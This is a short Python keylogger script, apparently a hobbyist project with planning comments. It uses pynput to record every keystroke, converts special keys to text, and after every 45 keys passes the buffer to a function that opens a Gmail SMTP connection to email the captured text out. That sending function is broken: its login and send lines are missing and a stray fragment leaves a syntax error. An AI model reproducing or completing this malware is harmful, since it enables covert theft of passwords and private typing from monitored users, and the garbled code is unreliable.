import pynput
import smtplib


from pynput.keyboard import Key, Listener





#count the keys
count_keys = 0
keys =[]
#take a list and remove everything that are not strings
#take the list and loop through the list and then check the type 
#check type(())
#create if statement depending on the situatiion
#return the list
#clear out all the non strings 
#if type equals string then pass else if element equals key space
#/n to create new line

#create a function that cleans up and removes the spaces and enters
# join and to create longer string
# def clean_up_sentences(list_):



#     for i in range(len(list_)):
#         if list_[i] == 'space':
#             list_[i] = ""
#     print(list_)
            
#  for key in keyss:
#         k = str(key).replace("'", "")
#         if 'space' in k:
#             report_to_file(str(k))           
        
        

def user_input(key):
    global count_keys, keys
    count_keys += 1
    
    
        
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.shift_r':
        key = ''
    elif key == 'Key.backspace':
        key = ''
    elif key == "Key.shift":
        key = ''
    elif key == "Key.enter":
        key = '\n'
        
    keys.append(key)
    if count_keys >= 45:
        count_keys = 0
        report_to_file(''.join(keys)) 
        keys = []   
              
    print(key)
    
    
    

def report_to_file(keys_entered):
    server = smtplib.SMTP('smtp.gmail.com', 587) 
    server.starttls()
    keys_entered)
    

    
def display_type(key):  

    #Stopping the program
    if key == Key.esc:
        return False
    
    
    

#Using the listener I will take in two agruments
#One argument will be used to detect what the user types while the other argument will display what the user types
with Listener(user_input, display_type) as listener:
    #I will create a loop to check when the keys are pressed 
    listener.join()
    
